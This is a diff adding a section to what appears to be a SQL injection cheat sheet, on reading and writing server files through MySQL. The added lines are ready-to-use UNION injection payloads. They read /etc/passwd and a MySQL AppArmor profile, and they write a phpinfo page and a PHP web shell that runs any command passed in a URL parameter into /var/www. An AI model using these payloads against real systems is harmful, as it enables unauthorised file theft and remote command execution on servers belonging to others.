@@ -96,6 +96,21 @@ Retrieve information about the database, SQL server and tables:
 • current_user() : Current User
 
 
+Reading local files with the LOAD_FILE function:
+
+SELECT * LOAD_FILE('/home/username/mytextfile.txt');
+0' UNION SELECT 1, load_file('/etc/passwd') #
+
+
+Writing files with the OUTFILE function:
+
+SELECT * [fields] INTO OUTFILE '/tmp/output.txt';
+0' UNION SELECT '<?php phpinfo();?>', null INTO OUTFILE '/var/www/info.php' #
+0' UNION SELECT '<?php echo shell_exec($_GET[\'cmd\']); ?>', null INTO OUTFILE '/var/www/cmd.php' #
+0' UNION SELECT 1, load_file('/etc/apparmor.d/usr.sbin.mysqld') #
+
+
+
 
 Finding the table name
 
